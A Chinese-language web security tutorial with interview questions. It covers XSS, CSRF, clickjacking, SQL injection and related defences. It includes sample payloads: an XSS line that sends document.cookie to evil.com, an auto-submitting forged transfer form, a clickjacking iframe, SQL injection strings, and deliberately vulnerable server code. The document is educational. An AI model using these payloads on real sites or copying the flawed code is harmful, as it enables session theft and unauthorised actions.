# 网络安全

## 概述

前端安全是 Web 应用开发中至关重要的一环。本文详细介绍常见的 Web 安全攻击类型、原理及防御措施。

## XSS（跨站脚本攻击）

### 什么是 XSS？

XSS（Cross-Site Scripting）是一种代码注入攻击，攻击者通过在目标网站注入恶意脚本，当用户浏览页面时，脚本会在用户浏览器中执行。

### XSS 的危害

- 窃取用户 Cookie 和敏感信息
- 劫持用户会话
- 修改页面内容，进行钓鱼攻击
- 记录用户键盘输入
- 传播恶意软件

### XSS 的类型

#### 1. 存储型 XSS（持久型）

```javascript
// 攻击原理：恶意脚本被存储到服务器数据库
// 常见场景：评论区、留言板、用户资料

// 攻击流程：
// 1. 攻击者提交恶意内容到服务器
// 2. 服务器存储恶意内容到数据库
// 3. 其他用户访问页面时，服务器返回恶意内容
// 4. 浏览器执行恶意脚本

// 示例：攻击者在评论区提交
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

// 当其他用户查看评论时，Cookie 被发送到攻击者服务器
```

#### 2. 反射型 XSS（非持久型）

```javascript
// 攻击原理：恶意脚本通过 URL 参数传递
// 常见场景：搜索功能、错误消息显示

// 攻击流程：
// 1. 攻击者构造包含恶意脚本的 URL
// 2. 诱导用户点击该 URL
// 3. 服务器将 URL 参数直接反射到页面
// 4. 浏览器执行恶意脚本

// 示例 URL：
// https://example.com/search?q=<script>alert('XSS')</script>

// 服务器代码（存在漏洞）：
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`搜索结果：${query}`); // 危险！直接输出用户输入
});
```

#### 3. DOM 型 XSS

```javascript
// 攻击原理：恶意脚本通过修改 DOM 执行
// 与反射型的区别：完全在客户端执行，不经过服务器

// 攻击流程：
// 1. 攻击者构造恶意 URL
// 2. 用户点击 URL
// 3. 客户端 JavaScript 从 URL 提取参数并插入 DOM
// 4. 浏览器执行恶意脚本

// 示例：
// URL: https://example.com/#<img src=x onerror=alert('XSS')>

// 存在漏洞的代码：
const hash = location.hash.slice(1);
document.getElementById('content').innerHTML = hash; // 危险！

// 攻击者利用 URL hash 注入：
// https://example.com/#<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

### XSS 防御措施

#### 1. 输出转义（最重要）

```javascript
// HTML 转义函数
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, char => escapeMap[char]);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
element.innerHTML = escapeHtml(userInput);
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
```

#### 2. 使用安全的 API

```javascript
// 不安全：innerHTML
element.innerHTML = userInput; // 危险！

// 安全：textContent
element.textContent = userInput; // 自动转义

// 不安全：document.write
document.write(userInput); // 危险！

// 安全：DOM API
const text = document.createTextNode(userInput);
element.appendChild(text);
```

#### 3. CSP（内容安全策略）

```javascript
// HTTP 响应头设置
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'

// CSP 指令说明
// default-src 'self'     - 默认只允许同源资源
// script-src 'self'      - 只允许同源脚本
// script-src 'nonce-xxx' - 只允许带有特定 nonce 的脚本
// style-src 'self'       - 只允许同源样式
// img-src *              - 允许任意来源的图片
// connect-src 'self'     - 只允许同源的 XHR/Fetch

// HTML 中使用 nonce
<script nonce="abc123">
  // 这个脚本会执行
</script>

<script>
  // 这个脚本会被 CSP 阻止
</script>
```

#### 4. HttpOnly Cookie

```javascript
// 服务器设置 Cookie
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// HttpOnly: JavaScript 无法访问该 Cookie
// Secure: 只在 HTTPS 下传输
// SameSite: 防止 CSRF 攻击

// Express 示例
res.cookie('sessionId', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

#### 5. 输入验证

```javascript
// 白名单验证
function validateInput(input) {
  // 只允许字母、数字和特定字符
  const pattern = /^[a-zA-Z0-9_-]+$/;
  return pattern.test(input);
}

// 长度限制
function limitLength(input, maxLength) {
  return input.slice(0, maxLength);
}

// URL 验证
function isValidUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

## CSRF（跨站请求伪造）

### 什么是 CSRF？

CSRF（Cross-Site Request Forgery）是一种利用用户已登录身份，诱导用户在不知情的情况下执行恶意操作的攻击。

### CSRF 攻击原理

```javascript
// 攻击流程：
// 1. 用户登录银行网站 bank.com，获得 Cookie
// 2. 用户访问恶意网站 evil.com
// 3. 恶意网站向 bank.com 发起请求
// 4. 浏览器自动带上 bank.com 的 Cookie
// 5. 银行服务器认为是用户本人操作

// 恶意网站代码：
<form action="https://bank.com/transfer" method="POST" id="evil-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.getElementById('evil-form').submit();
</script>

// 或者使用图片标签（GET 请求）：
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

### CSRF 防御措施

#### 1. CSRF Token

```javascript
// 服务器端：生成 Token
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// 返回给前端
res.render('form', { csrfToken });

// HTML 表单
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input type="text" name="to">
  <input type="number" name="amount">
  <button type="submit">转账</button>
</form>

// 服务器验证
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('CSRF token invalid');
  }
  // 处理转账...
});
```

#### 2. SameSite Cookie

```javascript
// SameSite 属性值：
// Strict: 完全禁止第三方 Cookie
// Lax: 允许部分第三方 Cookie（GET 导航）
// None: 允许第三方 Cookie（需要 Secure）

// 设置 Cookie
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// Express 示例
res.cookie('sessionId', 'abc123', {
  sameSite: 'strict',  // 或 'lax'
  secure: true,
  httpOnly: true
});

// SameSite=Strict vs Lax
// Strict: 用户从外部链接进入也不带 Cookie
// Lax: 用户从外部链接 GET 进入会带 Cookie
```

#### 3. 验证 Referer/Origin

```javascript
// 检查请求来源
app.post('/transfer', (req, res) => {
  const origin = req.get('Origin') || req.get('Referer');
  const allowedOrigins = ['https://bank.com'];

  if (!origin || !allowedOrigins.some(o => origin.startsWith(o))) {
    return res.status(403).send('Invalid origin');
  }

  // 处理请求...
});

// 注意：Referer 可能被用户禁用或被代理移除
// 建议与 CSRF Token 配合使用
```

#### 4. 双重 Cookie 验证

```javascript
// 原理：攻击者无法读取目标网站的 Cookie

// 1. 服务器设置 Cookie
Set-Cookie: csrf_token=abc123; SameSite=Lax

// 2. 前端请求时在 Header 中也带上 Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf_token')
  },
  body: JSON.stringify({ to: 'user', amount: 100 })
});

// 3. 服务器验证 Cookie 和 Header 是否一致
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies.csrf_token;
  const headerToken = req.get('X-CSRF-Token');

  if (cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }
  // 处理请求...
});
```

## 点击劫持（Clickjacking）

### 什么是点击劫持？

攻击者通过透明的 iframe 覆盖在正常页面上，诱导用户点击看似无害的按钮，实际上触发了 iframe 中的恶意操作。

### 攻击示例

```html
<!-- 恶意网站 -->
<style>
  #target-iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;  /* 完全透明 */
    z-index: 999;
  }
  #fake-button {
    position: absolute;
    top: 100px;
    left: 100px;
  }
</style>

<button id="fake-button">点击领取红包</button>
<iframe id="target-iframe" src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>

<!-- 用户以为点击领红包，实际点击了转账确认按钮 -->
```

### 防御措施

```javascript
// 1. X-Frame-Options 响应头
X-Frame-Options: DENY          // 禁止任何嵌入
X-Frame-Options: SAMEORIGIN    // 只允许同源嵌入

// Express 设置
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});

// 2. CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none'    // 禁止嵌入
Content-Security-Policy: frame-ancestors 'self'    // 同源嵌入

// 3. JavaScript 防御（Frame Busting）
if (self !== top) {
  top.location = self.location;
}

// 更安全的写法
<style id="antiClickjack">body { display: none !important; }</style>
<script>
  if (self === top) {
    document.getElementById('antiClickjack').remove();
  } else {
    top.location = self.location;
  }
</script>
```

## SQL 注入

### 什么是 SQL 注入？

攻击者通过在用户输入中插入恶意 SQL 语句，从而操控数据库执行非预期的操作。

### 攻击示例

```javascript
// 存在漏洞的代码
const username = req.body.username;
const password = req.body.password;
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// 攻击者输入：
// username: admin' --
// password: anything

// 生成的 SQL：
// SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
// -- 注释掉了密码验证

// 或者使用 OR 1=1：
// username: ' OR 1=1 --
// 生成：SELECT * FROM users WHERE username = '' OR 1=1 --'
// 返回所有用户
```

### 防御措施

```javascript
// 1. 参数化查询（最推荐）
// MySQL
const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
connection.query(sql, [username, password], callback);

// PostgreSQL
const sql = 'SELECT * FROM users WHERE username = $1 AND password = $2';
pool.query(sql, [username, password]);

// 2. ORM/查询构建器
// Sequelize
const user = await User.findOne({
  where: { username, password }
});

// Knex
const user = await knex('users')
  .where({ username, password })
  .first();

// 3. 输入验证
function validateUsername(username) {
  // 只允许字母数字
  return /^[a-zA-Z0-9_]+$/.test(username);
}

// 4. 最小权限原则
// 数据库用户只给予必要的权限
GRANT SELECT, INSERT ON app_db.* TO 'app_user'@'localhost';
```

## 其他安全问题

### 1. 中间人攻击（MITM）

```javascript
// 防御：使用 HTTPS
// 强制 HTTPS
app.use((req, res, next) => {
  if (!req.secure) {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});

// HSTS 响应头
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Express 设置
app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: true
}));
```

### 2. 开放重定向

```javascript
// 存在漏洞的代码
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url);  // 危险！可能重定向到恶意网站
});

// 攻击 URL：
// https://example.com/redirect?url=https://evil.com

// 防御：白名单验证
const allowedDomains = ['example.com', 'sub.example.com'];

app.get('/redirect', (req, res) => {
  const url = req.query.url;
  try {
    const parsed = new URL(url);
    if (!allowedDomains.includes(parsed.hostname)) {
      return res.status(400).send('Invalid redirect URL');
    }
    res.redirect(url);
  } catch {
    res.status(400).send('Invalid URL');
  }
});
```

### 3. 敏感信息泄露

```javascript
// 避免在前端存储敏感信息
// 不要存储在 localStorage
localStorage.setItem('token', 'xxx');  // 可被 XSS 获取

// 使用 HttpOnly Cookie
Set-Cookie: token=xxx; HttpOnly; Secure

// 错误信息不要暴露系统细节
// 错误的做法
res.status(500).send({ error: err.stack });

// 正确的做法
console.error(err);  // 服务器日志
res.status(500).send({ error: 'Internal server error' });
```

### 4. 文件上传安全

```javascript
// 验证文件类型
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];

function validateFile(file) {
  // 检查 MIME 类型
  if (!allowedTypes.includes(file.mimetype)) {
    return false;
  }

  // 检查扩展名
  const ext = path.extname(file.originalname).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    return false;
  }

  // 限制文件大小
  if (file.size > 5 * 1024 * 1024) {  // 5MB
    return false;
  }

  return true;
}

// 存储文件时重命名
const newFilename = crypto.randomBytes(16).toString('hex') + ext;
```

## 安全最佳实践

### 1. 安全响应头配置

```javascript
// 使用 helmet 中间件
const helmet = require('helmet');
app.use(helmet());

// 等同于设置以下响应头：
{
  "Content-Security-Policy": "default-src 'self'",
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "X-XSS-Protection": "0",
  "Strict-Transport-Security": "max-age=15552000; includeSubDomains"
}
```

### 2. 依赖安全

```bash
# 检查依赖漏洞
npm audit

# 自动修复
npm audit fix

# 使用 Snyk 检查
npx snyk test
```

### 3. 安全检查清单

```markdown
□ 所有用户输入都经过验证和转义
□ 使用 HTTPS 和 HSTS
□ Cookie 设置 HttpOnly、Secure、SameSite
□ 实现 CSRF 防护
□ 配置 CSP 响应头
□ 设置 X-Frame-Options
□ 敏感数据加密存储
□ 定期更新依赖包
□ 实现速率限制
□ 日志记录和监控
```

## 常见面试题

::: details 1. XSS 和 CSRF 的区别？
```javascript
// XSS（跨站脚本）
// - 攻击者注入脚本到受害网站
// - 在用户浏览器中执行恶意代码
// - 可以窃取 Cookie、修改页面、键盘记录等
// - 本质：代码注入

// CSRF（跨站请求伪造）
// - 攻击者诱导用户在已登录状态下访问恶意网站
// - 恶意网站向受害网站发起请求
// - 利用用户已有的登录凭证
// - 本质：借用身份

// 防御重点：
// XSS：输出转义、CSP、输入验证
// CSRF：Token、SameSite Cookie、验证来源
```
:::

::: details 2. 如何防止 XSS 攻击？
```javascript
// 1. 输出转义（根据上下文）
// HTML 上下文：转义 < > & " '
// JavaScript 上下文：JSON.stringify 或 JS 转义
// URL 上下文：encodeURIComponent
// CSS 上下文：CSS 转义

// 2. 使用安全的 API
element.textContent = userInput;  // 替代 innerHTML

// 3. CSP 策略
Content-Security-Policy: default-src 'self'; script-src 'self'

// 4. HttpOnly Cookie
Set-Cookie: session=xxx; HttpOnly

// 5. 输入验证
// 白名单验证，拒绝不符合预期的输入
```
:::

::: details 3. CSRF Token 为什么能防止 CSRF？
```javascript
// CSRF 攻击依赖于浏览器自动发送 Cookie
// 攻击者可以让浏览器发送请求，但无法获取 Token

// Token 存储在页面中（非 Cookie）
// 攻击者网站无法读取目标网站的页面内容（同源策略）
// 因此无法获得正确的 Token

// 流程：
// 1. 服务器生成随机 Token，存入 Session
// 2. Token 通过表单隐藏字段传给前端
// 3. 前端提交时带上 Token
// 4. 服务器验证 Token 是否匹配
```
:::

::: details 4. SameSite Cookie 的三个值有什么区别？
```javascript
// Strict
// - 最严格，完全禁止第三方 Cookie
// - 用户从外部链接进入也不带 Cookie
// - 可能影响用户体验（如从邮件链接进入需要重新登录）

// Lax（默认值）
// - 允许安全的顶级导航（GET 请求）带 Cookie
// - 阻止第三方网站的 POST、iframe、Ajax 请求带 Cookie
// - 平衡安全性和用户体验

// None
// - 允许第三方 Cookie
// - 必须配合 Secure 属性（HTTPS）
// - 用于需要跨站场景（如第三方登录）
```
:::

## 总结

| 攻击类型 | 原理 | 主要防御 |
|---------|------|---------|
| XSS | 注入恶意脚本 | 输出转义、CSP、HttpOnly |
| CSRF | 借用用户身份 | Token、SameSite、验证来源 |
| 点击劫持 | 透明 iframe 覆盖 | X-Frame-Options、CSP |
| SQL 注入 | 操控数据库 | 参数化查询、ORM |
| MITM | 拦截通信 | HTTPS、HSTS |
